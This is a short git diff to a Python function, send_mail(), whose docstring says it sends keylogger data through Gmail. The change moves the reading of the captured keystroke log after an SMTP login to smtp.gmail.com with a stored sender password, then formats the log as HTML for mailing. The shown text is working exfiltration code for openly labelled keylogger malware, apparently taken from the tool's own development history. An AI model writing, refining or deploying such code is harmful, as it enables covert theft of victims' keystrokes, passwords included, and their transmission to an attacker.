@@ -108,18 +108,18 @@ def send_mail() -> None:
   Send keylogger data through Gmail.
   """
   try:
-    print("Reading log file")
-    log_f.seek(0)
-    body = log_f.read()
-    body = body.replace("\n", "<br>").replace(" ", "&nbsp;")
-    body = f'<font size="4" face="Cascadia Mono">{body}</font>'
-
     print("Initialize and login gmail server")
     server = SMTP(host="smtp.gmail.com", port=587)
     server.ehlo()
     server.starttls(context=create_default_context())
     server.ehlo()
     server.login(user=SENDER, password=SMTP_PASSWORD)
+
+    print("Reading log file")
+    log_f.seek(0)
+    body = log_f.read().strip()
+    body = body.replace("\n", "<br>").replace(" ", "&nbsp;")
+    body = f'<font size="4" face="Cascadia Mono">{body}</font>'
 
     print("Initializing message")
     message = MIMEMultipart()
